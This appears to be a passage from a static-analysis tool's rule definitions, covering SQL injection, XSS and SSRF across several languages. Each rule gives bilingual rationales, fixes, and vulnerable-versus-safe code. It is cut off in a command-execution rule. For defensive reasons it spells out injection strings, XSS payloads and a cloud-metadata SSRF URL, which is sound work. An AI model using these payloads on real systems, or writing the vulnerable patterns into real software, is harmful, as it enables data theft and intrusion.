import {
  defineRule,
  type RuleDefinition,
  type RuleDescriptor,
  type RuleLanguage,
} from "@pgard/findings";

export type { RuleDescriptor, RuleLanguage } from "@pgard/findings";

const JS_TS: RuleLanguage[] = ["javascript", "typescript"];

export const SOURCE_RULES = [
  {
    id: "PG-SQL-001",
    title: "SQL built from dynamic strings in pg/mysql2 query",
    category: "injection",
    defaultSeverity: "high",
    scope: "code",
    languages: JS_TS,
    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
    rationale: {
      en: "When a request value is concatenated into the SQL text passed to a pg or mysql2 `query()`, an attacker can send input such as `' OR '1'='1` or `' UNION SELECT password FROM users -- ` that changes the statement itself. That can read other users' rows or other tables and skip a login check; where the driver allows multiple statements (pg does, mysql2 only with `multipleStatements: true`) it can also modify or delete data.",
      ko: "pg나 mysql2의 `query()`에 넘기는 SQL 문자열에 요청 값을 이어 붙이면, 공격자가 `' OR '1'='1`이나 `' UNION SELECT password FROM users -- ` 같은 입력으로 SQL 문 자체를 바꿀 수 있습니다. 그러면 다른 사용자의 행이나 다른 테이블을 조회하고 로그인 확인을 건너뛸 수 있으며, 드라이버가 여러 문장을 허용하면(pg는 허용, mysql2는 `multipleStatements: true`일 때만) 데이터를 수정·삭제할 수도 있습니다. 값이 요청, 파일 등 신뢰할 수 없는 출처에서 오면 언제나 해당됩니다.",
    },
    remediation: {
      en: "Keep the SQL text constant and pass the values as bound parameters: `pool.query('SELECT * FROM users WHERE id = $1', [id])` for pg, or `?` placeholders for mysql2. Table and column names cannot be bound, so pick them from a fixed allowlist instead of using input directly.",
      ko: "SQL 문자열은 고정해 두고 값은 바인딩된 매개변수로 전달하세요. pg는 `pool.query('SELECT * FROM users WHERE id = $1', [id])`, mysql2는 `?` 플레이스홀더를 사용합니다. 테이블 이름과 컬럼 이름은 바인딩할 수 없으므로 입력을 그대로 쓰지 말고 고정된 허용 목록(allowlist)에서 고르세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "pool.query(`SELECT * FROM users WHERE email = '${email}'`);",
        safe: "pool.query('SELECT * FROM users WHERE email = $1', [email]);",
        note: {
          en: "`email` set to `' OR '1'='1` returns every user in the first form and nothing in the second.",
          ko: "`email`이 `' OR '1'='1`이면 첫 번째 코드는 모든 사용자를 반환하고 두 번째 코드는 아무것도 반환하지 않습니다.",
        },
      },
    ],
  },
  {
    id: "PG-SQL-002",
    title: "Prisma unsafe raw query with dynamic SQL",
    category: "injection",
    defaultSeverity: "high",
    scope: "code",
    languages: JS_TS,
    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
    rationale: {
      en: "`$queryRawUnsafe` and `$executeRawUnsafe` send the string you build to the database as SQL, unchanged. Interpolating a request value lets an attacker alter the statement (for example `1 OR 1=1`) and read or change rows that Prisma's typed API would never expose.",
      ko: "`$queryRawUnsafe`와 `$executeRawUnsafe`는 만든 문자열을 그대로 SQL로 데이터베이스에 보냅니다. 요청 값을 끼워 넣으면 공격자가 SQL 문 자체를 바꿀 수 있고(예: `1 OR 1=1`), Prisma의 타입 지정 API로는 접근할 수 없었을 행을 조회하거나 수정할 수 있습니다.",
    },
    remediation: {
      en: 'Use the tagged templates, which turn every `${}` into a bound parameter: ``prisma.$queryRaw`SELECT * FROM "User" WHERE id = ${id}` `` (or compose with `Prisma.sql`). If you must call an Unsafe variant, keep the SQL text constant and pass the values as extra arguments (`$1`, `$2` on PostgreSQL, `?` on MySQL). Never pass a request value to `Prisma.raw`.',
      ko: '모든 `${}`를 바인딩된 매개변수로 바꿔 주는 태그드 템플릿을 사용하세요: ``prisma.$queryRaw`SELECT * FROM "User" WHERE id = ${id}` ``(또는 `Prisma.sql`로 조합). Unsafe 변형을 꼭 써야 한다면 SQL 문자열은 고정하고 값은 추가 인자(PostgreSQL은 `$1`, `$2`, MySQL은 `?`)로 전달하세요. 요청 값을 `Prisma.raw`에 넘기지 마세요.',
    },
    examples: [
      {
        language: "typescript",
        vulnerable:
          "await prisma.$queryRawUnsafe(`SELECT * FROM \"User\" WHERE name = '${name}'`);",
        safe: 'await prisma.$queryRaw`SELECT * FROM "User" WHERE name = ${name}`;',
      },
    ],
  },
  {
    id: "PG-SQL-003",
    title: "Go database/sql query built with fmt.Sprintf or concatenation",
    category: "injection",
    defaultSeverity: "high",
    scope: "code",
    languages: ["go"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
    rationale: {
      en: "Building the query with `fmt.Sprintf` or `+` puts request data into the SQL text that `database/sql` sends. An attacker can close the string literal and append conditions, for example `' OR '1'='1`, to bypass a filter or read other tables.",
      ko: "`fmt.Sprintf`나 `+`로 쿼리를 만들면 요청 데이터가 `database/sql`이 보내는 SQL 문자열에 들어갑니다. 공격자는 문자열 리터럴을 닫고 `' OR '1'='1` 같은 조건을 덧붙여 필터를 우회하거나 다른 테이블을 읽을 수 있습니다.",
    },
    remediation: {
      en: 'Write the SQL with placeholders (`?` for MySQL and SQLite, `$1` for PostgreSQL) and pass the values as arguments: `db.QueryContext(ctx, "SELECT * FROM users WHERE id = $1", id)`. Placeholders cannot replace table or column names; map those from a fixed allowlist.',
      ko: 'SQL은 플레이스홀더(MySQL·SQLite는 `?`, PostgreSQL은 `$1`)로 작성하고 값은 인자로 전달하세요: `db.QueryContext(ctx, "SELECT * FROM users WHERE id = $1", id)`. 플레이스홀더는 테이블 이름이나 컬럼 이름을 대신할 수 없으므로, 그런 값은 고정된 허용 목록(allowlist)에서 골라 쓰세요.',
    },
    examples: [
      {
        language: "go",
        vulnerable: 'rows, err := db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", id))',
        safe: 'rows, err := db.QueryContext(ctx, "SELECT * FROM users WHERE id = $1", id)',
      },
    ],
  },
  {
    id: "PG-SQL-004",
    title: "GORM raw SQL or condition built with fmt.Sprintf or concatenation",
    category: "injection",
    defaultSeverity: "high",
    scope: "code",
    languages: ["go"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
    rationale: {
      en: "`Raw`, `Exec` and `Where` with a string built using `fmt.Sprintf` or `+` send request data to the database as SQL text. A value such as `x' OR '1'='1` changes the condition and exposes or modifies rows the handler never meant to touch.",
      ko: "`fmt.Sprintf`나 `+`로 만든 문자열을 `Raw`, `Exec`, `Where`에 넘기면 요청 데이터가 SQL 문자열로 데이터베이스에 전달됩니다. `x' OR '1'='1` 같은 값이 조건을 바꿔, 핸들러가 건드릴 의도가 없던 행이 노출되거나 수정될 수 있습니다.",
    },
    remediation: {
      en: 'Pass the values as arguments to GORM placeholders: `db.Where("name = ?", name)`, `db.Raw("SELECT * FROM users WHERE id = ?", id)`. The struct form (`db.Where(&User{Name: name})`) is also safe, but it ignores zero values (`0`, `""`, `false`) and silently drops that condition, so use placeholders or the map form when a zero value is a valid filter. Never build the SQL string itself from input.',
      ko: '값은 GORM 플레이스홀더의 인자로 전달하세요: `db.Where("name = ?", name)`, `db.Raw("SELECT * FROM users WHERE id = ?", id)`. 구조체 형태(`db.Where(&User{Name: name})`)도 안전하지만 영값(`0`, `""`, `false`)은 무시되어 그 조건이 조용히 빠지므로, 영값도 유효한 필터라면 플레이스홀더나 맵 형태를 쓰세요. 입력으로 SQL 문자열 자체를 만들지 마세요.',
    },
    examples: [
      {
        language: "go",
        vulnerable: "db.Where(fmt.Sprintf(\"name = '%s'\", name)).Find(&users)",
        safe: 'db.Where("name = ?", name).Find(&users)',
      },
    ],
  },
  {
    id: "PG-SQL-005",
    title: "SQL built from dynamic strings in Java/Kotlin JDBC, JPA/Hibernate or MyBatis code",
    category: "injection",
    defaultSeverity: "high",
    scope: "code",
    languages: ["java", "kotlin"],
    standards: {
      owasp: ["A05:2025"],
      cwe: ["CWE-89"],
      cert: [{ kind: "direct", id: "IDS00-J" }],
    },
    rationale: {
      en: "When request data (a Spring `@RequestParam`, `request.getParameter()`, a Ktor `call.parameters` value) is concatenated, formatted or templated into SQL passed to JDBC, JdbcTemplate, JPA/Hibernate or a MyBatis `${}`, an attacker can close the string literal and add conditions such as `' OR '1'='1` or a `UNION SELECT`. That reads other rows and tables, skips a login check and, with stacked statements, changes data. A MyBatis `${}` is pasted into the SQL text, while `#{}` is bound as a parameter.",
      ko: "요청 데이터(Spring `@RequestParam`, `request.getParameter()`, Ktor `call.parameters` 값)를 JDBC, JdbcTemplate, JPA/Hibernate나 MyBatis `${}` 자리표시자에 넘기는 SQL 문자열에 이어 붙이거나 포맷하거나 템플릿으로 끼워 넣으면, 공격자가 문자열 리터럴을 닫고 `' OR '1'='1`이나 `UNION SELECT` 같은 조건을 덧붙일 수 있습니다. 그러면 다른 행과 테이블을 읽고 로그인 확인을 건너뛰며, 드라이버가 여러 문장을 허용하면 데이터도 바꿀 수 있습니다. MyBatis의 `${}`는 SQL 문자열에 그대로 붙지만 `#{}`는 매개변수로 바인딩됩니다.",
    },
    remediation: {
      en: "Keep the SQL text constant and bind the values: `?` with `PreparedStatement.setString`, `jdbcTemplate.query(sql, mapper, id)`, JPA `:name` with `setParameter`, and `#{name}` in MyBatis. Table and column names cannot be bound, so choose them from a fixed allowlist (a `switch` or a `Map.of(...)` lookup) instead of using the input. A numeric value should be parsed first (`Integer.parseInt`), and it then still has to be bound.",
      ko: "SQL 문자열은 고정해 두고 값은 바인딩하세요. `PreparedStatement.setString`과 `?`, `jdbcTemplate.query(sql, mapper, id)`, JPA의 `:name`과 `setParameter`, MyBatis의 `#{name}`을 사용합니다. 테이블 이름과 컬럼 이름은 바인딩할 수 없으므로 입력을 그대로 쓰지 말고 고정된 허용 목록(`switch`나 `Map.of(...)` 조회)에서 고르세요. 숫자 값은 먼저 `Integer.parseInt`로 변환하되, 그 뒤에도 바인딩해야 합니다.",
    },
    examples: [
      {
        language: "java",
        vulnerable:
          'jdbcTemplate.query("SELECT * FROM users WHERE name = \'" + name + "\'", mapper);',
        safe: 'jdbcTemplate.query("SELECT * FROM users WHERE name = ?", mapper, name);',
        note: {
          en: "`name` set to `' OR '1'='1` returns every user in the first form and nothing in the second.",
          ko: "`name`이 `' OR '1'='1`이면 첫 번째 코드는 모든 사용자를 반환하고 두 번째 코드는 아무것도 반환하지 않습니다.",
        },
      },
      {
        language: "xml",
        vulnerable: "<select id=\"byName\">SELECT * FROM users WHERE name = '${name}'</select>",
        safe: '<select id="byName">SELECT * FROM users WHERE name = #{name}</select>',
      },
    ],
  },
  {
    id: "PG-SQL-006",
    title: "SQL built from dynamic strings in Python DB-API, SQLAlchemy text() or Django raw SQL",
    category: "injection",
    defaultSeverity: "high",
    scope: "code",
    languages: ["python"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
    rationale: {
      en: "When request data (a Flask `request.args`, a Django `request.GET`, a FastAPI route parameter) is formatted into the SQL passed to `cursor.execute()`, SQLAlchemy `text()`, Django `.raw()`, `.extra()` or `RawSQL`, an attacker can close the string literal and add conditions such as `' OR '1'='1` or a `UNION SELECT`. That reads other rows and tables, skips a login check and, with stacked statements, changes data. `%`, `+`, `.format()` and f-strings all paste the value into the SQL text.",
      ko: "요청 데이터(Flask `request.args`, Django `request.GET`, FastAPI 라우트 매개변수)를 `cursor.execute()`, SQLAlchemy `text()`, Django `.raw()`·`.extra()`·`RawSQL`에 넘기는 SQL 문자열에 포맷하면, 공격자가 문자열 리터럴을 닫고 `' OR '1'='1`이나 `UNION SELECT` 같은 조건을 덧붙일 수 있습니다. 그러면 다른 행과 테이블을 읽고 로그인 확인을 건너뛰며, 여러 문장을 허용하면 데이터도 바꿀 수 있습니다. `%`, `+`, `.format()`, f-string은 모두 값을 SQL 문자열에 그대로 붙입니다.",
    },
    remediation: {
      en: "Keep the SQL text constant and pass the values as the second argument: `cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))` (`?` for sqlite3), `session.execute(text('... WHERE id = :id'), {'id': user_id})`, and `Model.objects.raw('... WHERE id = %s', [user_id])` in Django. Never put `%` or an f-string around the value yourself. Table and column names cannot be bound, so pick them from a fixed allowlist (a dict lookup, or `psycopg2.sql.Identifier`) instead of using input directly.",
      ko: "SQL 문자열은 고정해 두고 값은 두 번째 인자로 전달하세요: `cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))`(sqlite3는 `?`), `session.execute(text('... WHERE id = :id'), {'id': user_id})`, Django는 `Model.objects.raw('... WHERE id = %s', [user_id])`. 값을 `%`나 f-string으로 직접 끼워 넣지 마세요. 테이블 이름과 컬럼 이름은 바인딩할 수 없으므로 입력을 그대로 쓰지 말고 고정된 허용 목록(allowlist: dict 조회나 `psycopg2.sql.Identifier`)에서 고르세요.",
    },
    examples: [
      {
        language: "python",
        vulnerable: "cursor.execute(f\"SELECT * FROM users WHERE name = '{name}'\")",
        safe: 'cursor.execute("SELECT * FROM users WHERE name = %s", (name,))',
        note: {
          en: "`name` set to `' OR '1'='1` returns every user in the first form and nothing in the second.",
          ko: "`name`이 `' OR '1'='1`이면 첫 번째 코드는 모든 사용자를 반환하고 두 번째 코드는 아무것도 반환하지 않습니다.",
        },
      },
      {
        language: "python",
        vulnerable: "User.objects.raw(\"SELECT * FROM auth_user WHERE username = '%s'\" % name)",
        safe: 'User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [name])',
      },
    ],
  },
  {
    id: "PG-SQL-007",
    title: "SQL built from dynamic strings in PHP (mysqli, PDO, Laravel, Doctrine)",
    category: "injection",
    defaultSeverity: "high",
    scope: "code",
    languages: ["php"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
    rationale: {
      en: "Request data (`$_GET`, `$_POST`, `$request->input()`) concatenated with `.`, interpolated into a double-quoted string or heredoc, or formatted with `sprintf` into SQL for `mysqli_query`, PDO `query`/`exec`/`prepare`, Laravel `DB::raw`/`DB::select`/`whereRaw` or Doctrine `createQuery` lets an attacker close the string literal and add `' OR '1'='1` or a `UNION SELECT`. That reads other rows, skips a login check and, with stacked statements, changes data. Preparing a built string does not help.",
      ko: "요청 데이터(`$_GET`, `$_POST`, `$request->input()`)를 `.`로 잇거나 큰따옴표 문자열·heredoc에 끼워 넣거나 `sprintf`로 포맷해서 `mysqli_query`, PDO `query`/`exec`/`prepare`, Laravel `DB::raw`/`DB::select`/`whereRaw`, Doctrine `createQuery`에 넘기는 SQL에 넣으면, 공격자가 문자열 리터럴을 닫고 `' OR '1'='1`이나 `UNION SELECT`를 덧붙일 수 있습니다. 그러면 다른 행을 읽고 로그인 확인을 건너뛰며, 여러 문장이 허용되면 데이터도 바꿉니다. 이미 만들어진 문자열을 `prepare`해도 소용없습니다.",
    },
    remediation: {
      en: "Keep the SQL constant and bind the values: PDO `prepare('... WHERE id = :id')` then `execute(['id' => $id])`, mysqli `bind_param`, Laravel `DB::select('... WHERE id = ?', [$id])` and `whereRaw('a = ?', [$a])`, Doctrine `setParameter`. Names cannot be bound: pick them from an allowlist (`in_array($col, [...], true)` with an early return). Cast numbers first (`(int) $id`). `addslashes` and `mysqli_real_escape_string` are not enough.",
      ko: "SQL은 고정해 두고 값은 바인딩하세요. PDO는 `prepare('... WHERE id = :id')` 후 `execute(['id' => $id])`, mysqli는 `bind_param`, Laravel은 `DB::select('... WHERE id = ?', [$id])`와 `whereRaw('a = ?', [$a])`, Doctrine은 `setParameter`를 씁니다. 이름은 바인딩할 수 없으니 허용 목록(allowlist)에서 고르세요(`in_array($col, [...], true)`로 확인하고 아니면 바로 반환). 숫자는 먼저 `(int) $id`로 변환하세요. `addslashes`나 `mysqli_real_escape_string`만으로는 충분하지 않습니다.",
    },
    examples: [
      {
        language: "php",
        vulnerable:
          "$result = mysqli_query($conn, \"SELECT * FROM users WHERE name = '\" . $_GET['name'] . \"'\");",
        safe: "$stmt = $pdo->prepare('SELECT * FROM users WHERE name = :name');\n$stmt->execute(['name' => $_GET['name']]);",
        note: {
          en: "`name` set to `' OR '1'='1` returns every user in the first form and nothing in the second.",
          ko: "`name`이 `' OR '1'='1`이면 첫 번째 코드는 모든 사용자를 반환하고 두 번째 코드는 아무것도 반환하지 않습니다.",
        },
      },
      {
        language: "php",
        vulnerable: '$users = DB::select("SELECT * FROM users WHERE id = $id");',
        safe: "$users = DB::select('SELECT * FROM users WHERE id = ?', [$id]);",
      },
    ],
  },
  {
    id: "PG-XSS-001",
    title: "Dynamic HTML written to innerHTML/outerHTML/document.write/jQuery .html()",
    category: "xss",
    defaultSeverity: "high",
    scope: "code",
    languages: JS_TS,
    standards: { owasp: ["A05:2025"], cwe: ["CWE-79"], cert: [] },
    rationale: {
      en: "Assigning HTML that contains request or stored data to `innerHTML`, `outerHTML`, `document.write` or jQuery `.html()` makes the browser parse it as markup. An attacker who controls part of it can inject `<img src=x onerror=...>` or `<svg onload=...>` (a `<script>` tag set through `innerHTML` does not run, but event handlers do) and run code in the victim's session, read tokens held in the page, or send requests with that user's rights.",
      ko: "요청이나 저장된 데이터가 들어 있는 HTML을 `innerHTML`, `outerHTML`, `document.write`, jQuery `.html()`에 넣으면 브라우저가 이를 마크업으로 해석합니다. 일부라도 공격자가 정할 수 있으면 `<img src=x onerror=...>`나 `<svg onload=...>`를 주입해(`innerHTML`로 넣은 `<script>` 태그는 실행되지 않지만 이벤트 핸들러는 실행됩니다) 피해자의 세션에서 코드를 실행하고, 페이지에 있는 토큰을 읽거나, 그 사용자 권한으로 요청을 보낼 수 있습니다.",
    },
    remediation: {
      en: "Insert text with `textContent` (or `createElement` and `append`) so the browser never parses it as HTML. If you must render HTML, sanitize it with a maintained sanitizer first, as in `el.innerHTML = DOMPurify.sanitize(html)`, and keep a Content-Security-Policy as a second layer.",
      ko: "텍스트는 `textContent`(또는 `createElement`와 `append`)로 넣어 브라우저가 HTML로 해석하지 않게 하세요. HTML을 꼭 렌더링해야 한다면 먼저 `el.innerHTML = DOMPurify.sanitize(html)`처럼 꾸준히 유지보수되는 sanitizer로 sanitize하고, 보조 방어선으로 Content-Security-Policy를 함께 두세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "el.innerHTML = `<p>${comment}</p>`;",
        safe: "const p = document.createElement('p');\np.textContent = comment;\nel.append(p);",
      },
    ],
  },
  {
    id: "PG-XSS-002",
    title: "Dynamic HTML passed to React dangerouslySetInnerHTML",
    category: "xss",
    defaultSeverity: "high",
    scope: "code",
    languages: ["react"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-79"], cert: [] },
    rationale: {
      en: "React escapes values in JSX, but `dangerouslySetInnerHTML` bypasses that. HTML that contains request or stored data lets an attacker inject markup such as `<img src=x onerror=...>` and run script as the user who views the page.",
      ko: "React는 JSX의 값을 이스케이프하지만 `dangerouslySetInnerHTML`은 이를 우회합니다. 요청이나 저장된 데이터가 들어 있는 HTML을 넣으면 공격자가 `<img src=x onerror=...>` 같은 마크업을 주입해 페이지를 보는 사용자 권한으로 스크립트를 실행할 수 있습니다.",
    },
    remediation: {
      en: "Render the value as a JSX child (`<p>{comment}</p>`), which React escapes. If the content really is HTML, sanitize it first: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />`.",
      ko: "값을 JSX 자식(`<p>{comment}</p>`)으로 렌더링하면 React가 이스케이프합니다. 내용이 정말 HTML이라면 먼저 sanitize하세요: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />`.",
    },
    examples: [
      {
        language: "react",
        vulnerable: "<div dangerouslySetInnerHTML={{ __html: comment }} />",
        safe: "<p>{comment}</p>",
      },
    ],
  },
  {
    id: "PG-XSS-003",
    title: "Dynamic HTML bound with Vue v-html",
    category: "xss",
    defaultSeverity: "high",
    scope: "code",
    languages: ["vue"],
    standards: { owasp: ["A05:2025"], cwe: ["CWE-79"], cert: [] },
    rationale: {
      en: "`v-html` inserts its value as raw HTML and skips Vue's escaping. If the value contains request or stored data, an attacker can inject markup such as `<img src=x onerror=...>` and run script as the user who views the page.",
      ko: "`v-html`은 값을 원시 HTML로 삽입하며 Vue의 이스케이프를 건너뜁니다. 값에 요청이나 저장된 데이터가 들어 있으면 공격자가 `<img src=x onerror=...>` 같은 마크업을 주입해 페이지를 보는 사용자 권한으로 스크립트를 실행할 수 있습니다.",
    },
    remediation: {
      en: "Use text interpolation (`{{ comment }}`), which Vue escapes. If the content really is HTML, bind a sanitized copy, for example a computed value built with `DOMPurify.sanitize(html)`, and do not bind user-supplied HTML at all when plain text is enough.",
      ko: "Vue가 이스케이프하는 텍스트 보간(`{{ comment }}`)을 사용하세요. 내용이 정말 HTML이라면 `DOMPurify.sanitize(html)`로 만든 computed 값처럼 sanitize한 사본을 바인딩하고, 일반 텍스트로 충분하다면 사용자가 준 HTML은 아예 바인딩하지 마세요.",
    },
    examples: [
      { language: "vue", vulnerable: '<div v-html="comment"></div>', safe: "<p>{{ comment }}</p>" },
    ],
  },
  {
    id: "PG-SSRF-001",
    title: "Server-side HTTP request to a URL from request input",
    category: "ssrf",
    defaultSeverity: "high",
    scope: "code",
    languages: ["javascript", "typescript", "go"],
    standards: { owasp: ["A01:2025"], cwe: ["CWE-918"], cert: [] },
    rationale: {
      en: "When the server fetches a URL taken from request input, an attacker can point it at internal targets such as `http://169.254.169.254/` (cloud metadata with credentials), `http://localhost:6379` or admin pages on the private network. The response, or an error or timing difference, leaks data the attacker could never reach directly. Redirects and host names that resolve to private addresses defeat simple checks.",
      ko: "서버가 요청 입력에서 받은 URL을 가져오면 공격자는 `http://169.254.169.254/`(자격 증명이 담긴 클라우드 메타데이터), `http://localhost:6379`, 사설망의 관리 페이지 같은 내부 대상을 가리킬 수 있습니다. 응답이나 오류·응답 시간의 차이를 통해 공격자가 직접 닿을 수 없던 데이터가 새어 나갑니다. 리다이렉트나 사설 주소로 확인되는 호스트 이름은 단순한 검사를 무력화합니다.",
    },
    remediation: {
      en: "Do not fetch raw user URLs; prefer an id that maps to a fixed URL. Otherwise (PGARD still reports a fetch of a validated user URL, so review that finding by hand) parse the URL, allow only `https` and hosts on an allowlist, resolve the host and reject loopback, link-local and private addresses, connect to the address you checked (to avoid DNS rebinding), and disable redirects or re-check each hop. Also require IMDSv2 or the equivalent on cloud metadata services.",
      ko: "사용자가 준 URL을 그대로 가져오지 말고, 고정 URL에 대응하는 id를 쓰는 편이 좋습니다. 그렇지 않다면(검증한 사용자 URL을 가져오는 코드도 PGARD는 계속 보고하므로 그 항목은 직접 검토하세요) URL을 파싱해 `https`와 허용 목록(allowlist)의 호스트만 허용하고, 호스트 이름을 IP로 확인(resolve)해 loopback·링크 로컬·사설 주소를 거부하세요. 검사한 바로 그 주소로 연결해 DNS rebinding을 막고, 리다이렉트는 끄거나 단계마다 다시 검사하세요. 클라우드 메타데이터 서비스에는 IMDSv2 같은 보호도 적용하세요.",
    },
    examples: [
      {
        language: "javascript",
        vulnerable: "const res = await fetch(req.query.url);",
        safe: "const res = await fetch(FEEDS[req.query.id]); // FEEDS maps ids to fixed https URLs",
        note: {
          en: "When users really must supply a URL, validate it as described in the remediation and review the finding by hand.",
          ko: "사용자가 URL을 직접 줘야 한다면 조치 방법대로 검증하고, 보고된 항목은 직접 검토하세요.",
        },
      },
    ],
  },
  {
    id: "PG-XSS-004",
    title:
      "Request data written to an HTML response in Java/Kotlin (servlet writer, JSP, Thymeleaf th:utext)",
    category: "xss",
    defaultSeverity: "high",
    scope: "code",
    languages: ["java", "kotlin"],
    standards: {
      owasp: ["A05:2025"],
      cwe: ["CWE-79"],
      cert: [],
      noDirectCert: {
        en: "No CERT rule maps directly; related recommendation: IDS51-J Properly encode or escape output (recommendations are not linked).",
        ko: "직접 대응하는 CERT 규칙이 없습니다. 관련 권고: IDS51-J Properly encode or escape output (권고는 연결하지 않습니다).",
      },
    },
    rationale: {
      en: 'Request data (`request.getParameter()`, a Spring `@RequestParam`, a Ktor `call.parameters` value) written unescaped into an HTML response lets an attacker inject `<img src=x onerror=...>` and run script as the user. Forms: `response.getWriter().write(...)`, a `@ResponseBody` handler returning HTML, JSP `<%= %>` or `${param.x}`, `<c:out escapeXml="false">`, Thymeleaf `th:utext`. JSON, `th:text`, `<c:out>` and `fn:escapeXml` escape and are not reported. Escaping helpers: low confidence.',
      ko: '요청 데이터(`request.getParameter()`, Spring `@RequestParam`, Ktor `call.parameters`)를 이스케이프 없이 HTML 응답에 쓰면 공격자가 `<img src=x onerror=...>` 같은 마크업을 주입해 사용자 권한으로 스크립트를 실행할 수 있습니다. 해당 형태: `response.getWriter().write(...)`, HTML을 반환하는 `@ResponseBody`, JSP `<%= %>`·`out.print`·`${param.x}`, `<c:out escapeXml="false">`, Thymeleaf `th:utext`. JSON, `th:text`, `<c:out>`, `fn:escapeXml`은 이스케이프하므로 보고하지 않으며, 이스케이프 도우미를 거친 값은 낮은 신뢰도로 보고합니다.',
    },
    remediation: {
      en: 'Let the template escape: Thymeleaf `th:text` (not `th:utext`), JSP `<c:out value="${param.name}"/>` or `${fn:escapeXml(param.name)}`. In a servlet or `@ResponseBody` method return JSON or plain text, or call `HtmlUtils.htmlEscape(name)` / `Encode.forHtml(name)` before writing markup. Add a Content-Security-Policy as a second layer. `th:utext` and `escapeXml="false"` are only for HTML you wrote or sanitized.',
      ko: '템플릿이 이스케이프하게 하세요. Thymeleaf는 `th:utext` 대신 `th:text`, JSP는 `<c:out value="${param.name}"/>` 또는 `${fn:escapeXml(param.name)}`를 씁니다. 서블릿이나 `@ResponseBody`에서는 JSON이나 일반 텍스트로 응답하거나, 마크업을 쓰기 전에 `HtmlUtils.htmlEscape(name)` / `Encode.forHtml(name)`을 호출하세요. 보조 방어선으로 Content-Security-Policy도 두세요. `th:utext`와 `escapeXml="false"`는 직접 작성했거나 sanitize한 HTML에만 쓰세요.',
    },
    examples: [
      {
        language: "java",
        vulnerable:
          'response.setContentType("text/html");\nresponse.getWriter().println("<h1>Hello " + request.getParameter("name") + "</h1>");',
        safe: 'response.setContentType("text/html");\nresponse.getWriter().println("<h1>Hello " + HtmlUtils.htmlEscape(request.getParameter("name")) + "</h1>");',
        note: {
          en: "`name` set to `<img src=x onerror=alert(1)>` runs the script in the first form; the second form shows it as text. A template (`th:text`, `<c:out>`) does this for you.",
          ko: "`name`이 `<img src=x onerror=alert(1)>`이면 첫 번째 코드는 스크립트를 실행하고, 두 번째 코드는 텍스트로 보여 줍니다. 템플릿(`th:text`, `<c:out>`)은 이 작업을 대신해 줍니다.",
        },
      },
    ],
  },
  {
    id: "PG-SSRF-002",
    title: "Server-side HTTP request to a URL from request input in Java/Kotlin",
    category: "ssrf",
    defaultSeverity: "high",
    scope: "code",
    languages: ["java", "kotlin"],
    standards: {
      owasp: ["A01:2025"],
      cwe: ["CWE-918"],
      cert: [],
      noDirectCert: {
        en: "No CERT rule maps directly.",
        ko: "직접 대응하는 CERT 규칙이 없습니다.",
      },
    },
    rationale: {
      en: "A URL built from request input and fetched by the server (`URL.openConnection()`, `HttpRequest.newBuilder(URI.create(x))`, `RestTemplate.getForObject`, `WebClient.get().uri(x)`, OkHttp `url(x)`, `new HttpGet(x)`, Ktor `client.get(x)`) lets an attacker reach internal targets such as `http://169.254.169.254/` (cloud credentials) or `http://localhost:6379`. A fixed host with only a path or query from the request, or a host checked against an allowlist, is reported at low confidence.",
      ko: "서버가 요청 입력으로 만든 URL(`URL.openConnection()`, `HttpRequest.newBuilder(URI.create(x))`, `RestTemplate.getForObject`, `WebClient.get().uri(x)`, OkHttp `url(x)`, `new HttpGet(x)`, Ktor `client.get(x)`)을 가져오면 공격자는 `http://169.254.169.254/`(클라우드 자격 증명)나 `http://localhost:6379` 같은 내부 대상에 닿을 수 있습니다. 호스트가 고정이고 경로·쿼리만 요청에서 오거나 호스트를 허용 목록으로 검사한 경우는 낮은 신뢰도로 보고합니다.",
    },
    remediation: {
      en: "Prefer an id that maps to a fixed URL (`FEEDS.get(id)`). Otherwise parse the URL, allow only `https` and allowlisted hosts (compare the whole host, not `endsWith`), resolve the host and reject loopback, link-local and private addresses, connect to the address you checked, and disable redirects or re-check each hop. For a user path segment use `UriComponentsBuilder.pathSegment(...)` and reject `..`. Require IMDSv2 on cloud metadata. Review low-confidence findings by hand.",
      ko: "고정 URL에 대응하는 id를 쓰는 편이 좋습니다(`FEEDS.get(id)`). 그렇지 않다면 URL을 파싱해 `https`와 허용 목록의 호스트만 허용하고(`endsWith`가 아니라 호스트 전체 비교), 호스트를 IP로 확인해 loopback·링크 로컬·사설 주소를 거부하세요. 검사한 주소로 연결하고 리다이렉트는 끄거나 단계마다 다시 검사합니다. 사용자 경로 조각은 `UriComponentsBuilder.pathSegment(...)`로 만들고 `..`를 거부하세요. 클라우드 메타데이터에는 IMDSv2를 적용하세요. 낮은 신뢰도 항목은 직접 검토하세요.",
    },
    examples: [
      {
        language: "java",
        vulnerable:
          'String body = restTemplate.getForObject(request.getParameter("url"), String.class);',
        safe: 'String body = restTemplate.getForObject(FEEDS.get(request.getParameter("id")), String.class); // FEEDS maps ids to fixed https URLs',
        note: {
          en: "`url` set to `http://169.254.169.254/latest/meta-data/` returns the instance credentials in the first form; the second form can only reach the listed feeds.",
          ko: "`url`이 `http://169.254.169.254/latest/meta-data/`이면 첫 번째 코드는 인스턴스 자격 증명을 반환하고, 두 번째 코드는 목록에 있는 피드에만 닿습니다.",
        },
      },
      {
        language: "kotlin",
        vulnerable: 'val page = client.get(call.parameters["url"]!!).bodyAsText()',
        safe: 'val host = URI(url).host\nrequire(host in ALLOWED_HOSTS) { "host" }\nval page = client.get(url).bodyAsText()',
      },
    ],
  },
  {
    id: "PG-CMD-001",
    title: "Shell command built from dynamic strings (child_process)",
    category: "command_execution",
    defaultSeverity: "high",
    scope: "code",
    languages: JS_TS,
    standards: {
      owasp: ["A05:2025"],
      cwe: ["CWE-78"],
